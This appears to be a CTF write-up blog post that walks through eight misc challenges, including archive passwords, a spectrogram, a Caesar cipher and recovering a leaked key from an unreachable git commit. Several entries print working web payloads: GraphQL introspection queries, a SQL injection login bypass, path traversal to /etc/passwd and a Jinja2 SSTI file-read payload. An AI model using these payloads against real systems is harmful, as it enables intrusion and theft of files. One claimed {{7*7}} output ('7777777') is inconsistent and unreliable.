---
layout: post
title:  "Misc Challenges"
date:   2026-10-12 13:07:00 -0400
author: uzi
tags: [CTF]
permalink: /kubstu-ctf-2026-misc/
---
* TOC
{:toc}

## Matryoshka
{% raw %}
**Category**: misc

**Description**: Ten archives, one inside another. Each one tells you how to open the next.

I get the challenge file:
```shell
unzip matryoshka.zip  
Archive:  matryoshka.zip  
5ox5iae8pv05  
  inflating: README.ru.txt  
  inflating: README.txt  
  inflating: level02.zip
```

There are 10 levels. Each level required some sort of decoding. Each hint was either left in a new text file or in the comment metadata section. All passwords:
```shell
zip  1: no password
zip  2: 5ox5iae8pv05
zip  3: zhag10uct4w6j
zip  4: y_2txz7j8veiyls
zip  5: sy8vafa09nseeyt
zip  6: zjcp1s35m_q5
zip  7: urpmkg2azc
zip  8: x9sh8ougi720k
zip  9: nhd7rpralyg
zip 10: 0hs0k6y810
```

`kubstu{t3n_l4y3rs_d33p_991939c0}`

___

## Transmission

**Category**: misc

**Description**: A single audio capture, nothing else came with it.

I get the challenge file:
```shell
file transmission.wav  
transmission.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 22050 Hz
```

Opening the file in audacity and looking at the spectrogram view:

![Alt text](/images/spectro38625255.png)

`kubstu{h34r_th3_p1ctur3_8a72}`

___

## Vireo

**Category**: misc

**Description**: Our workplace assistant.

Going to the website:

![Alt text](/images/kubweb13.png)

They advertise a `/graphql` endpoint. I tested introspection:
```shell
curl -s http://159.194.244.226:8084/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{fields{name}}}}"}'  
{"data":{"__schema":{"queryType":{"fields":[{"name":"me"},{"name":"documents"},{"name":"document"},{"name":"internal"}]}}}}
```
It is enabled.

`Internal` holds `secret`:
```shell
curl -s -X POST http://159.194.244.226:8084/graphql -H 'Content-Type: application/json' -d '{"query":"{__type(name:\"Internal\"){fields{name}}}"}'  
{"data":{"__type":{"fields":[{"name":"buildRef"},{"name":"deployedBy"},{"name":"secret"}]}}}
```

```shell
curl -s -X POST http://159.194.244.226:8084/graphql -H 'Content-Type: application/json' -d '{"query":"{internal{secret}}"}'  
{"data":{"internal":{"secret":"kubstu{v1r30_1ntr0sp3ct10n_869998f1}"}}}
```

`kubstu{v1r30_1ntr0sp3ct10n_869998f1}`

___

## Shiffted

**Category**: misc

**Description**: We intercepted a message, but the letters seem to have slipped out of place. They say a certain ancient Roman general used to encrypt exactly like this. Shift them back.

Challenge file:
```shell
cat cipher.txt  
RbiZAB{j43z4y_d0bsk_i3_wy0bk}
```

rot19: [cyberchef link](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,19)&input=UmJpWkFCe2o0M3o0eV9kMGJza19pM193eTBia30)

`KubSTU{c43s4r_w0uld_b3_pr0ud}`

___

## Gridlock

**Category**: misc

**Description**: Operator access console. Log in as admin.

Going to the challenge site:

![Alt text](/images/kubweb14.png)

Login with `admin' OR 1=1--:admin' OR 1=1--`:

![Alt text](/images/kubweb15.png)

`kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}`

___

## Honeyleaf

**Category**: misc

**Description**: Receipt archive of a small bakery.

Going to the challenge site:

![Alt text](/images/kubweb16.png)

They open files like this:
```shell
http://159.194.244.226:8083/view?file=2026-03-09-sunday-counter.txt
```

![Alt text](/images/kubweb17.png)

Going to `http://159.194.244.226:8083/view?file=../../../../etc/passwd` reads the file:

![Alt text](/images/kubweb18.png)

I found the flag at `http://159.194.244.226:8083/view?file=../../../../flag.txt`.

`kubstu{h0n3yl34f_p4th_tr4v3rs4l_defd1128}`

___

## Clearline

**Category**: misc

**Description**: An expression calculator. Is it safe?

Looking at the challenge site:

![Alt text](/images/kubweb19.png)

Going to `http://159.194.244.226:8082/?expr=%7B%7B7*7%7D%7D` does result in `7777777`:

![Alt text](/images/kubweb20.png)

This confirms the site is vulnerable to Jinja2 SSTI.

`{{ lipsum.__globals__["__builtins__"].open("/etc/passwd").read() }}` opens the file:

![Alt text](/images/kubweb21.png)

`{{ lipsum.__globals__["__builtins__"].open("/flag.txt").read() }}` reads the flag file.

`kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`

___

## Grep: almost but not quite

**Category**: misc

**Description**: The security team has detected suspicious activity: service keys have leaked from the production environment. A developer claims to have noticed the error promptly, reverted the changes, and insists that the secret is no longer present in the clean repository.

However, the security team disagrees with him. They provided you with this archive and asked you to find the very service key he's talking about.

I unzip the challenge file:
```shell
unzip ctf_repo.zip  
Archive:  ctf_repo.zip  
   creating: ctf_repo/  
   creating: ctf_repo/.git/  
 extracting: ctf_repo/.git/COMMIT_EDITMSG  
 extracting: ctf_repo/.git/HEAD  
 extracting: ctf_repo/.git/ORIG_HEAD  
  inflating: ctf_repo/.git/config  
  inflating: ctf_repo/.git/description  
   creating: ctf_repo/.git/hooks/  
  inflating: ctf_repo/.git/hooks/applypatch-msg.sample  
  inflating: ctf_repo/.git/hooks/commit-msg.sample
  
... etc ...
```

I checked `git log` but none of the commits contained the flag. There was an unreachable commit:
```shell
git fsck --full --unreachable --no-reflogs  
Checking object directories: 100% (256/256), done.  
unreachable blob ff326109249b7b1dffb320e1a4c541d757cb2273  
unreachable tree 14c5cf076e47d63a41947137bb5454f0f0cb6643  
unreachable tree bacbd6639c835cf10c81b81c702a4bc9b63eb351  
unreachable commit 3bdea0f23e83a6a3757ae2b7c7b781c174493d26
```

```shell
git show 3bdea0f23e83a6a3757ae2b7c7b781c174493d26  
commit 3bdea0f23e83a6a3757ae2b7c7b781c174493d26  
Author: alex-devops <alex.dev@corp-internal.local>  
Date:   Sun Oct 4 15:24:50 2026 +0300  
  
	chore: add production env file  
  
diff --git a/config/.env.production b/config/.env.production  
new file mode 100644  
index 0000000..ff32610  
--- /dev/null  
+++ b/config/.env.production  
@@ -0,0 +1 @@  
+export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7KubCTF{d4ngl1ng?_Ye4h_1ve_he4rd_0f_1t.}
```
{% endraw %}
`KubCTF{d4ngl1ng?_Ye4h_1ve_he4rd_0f_1t.}`
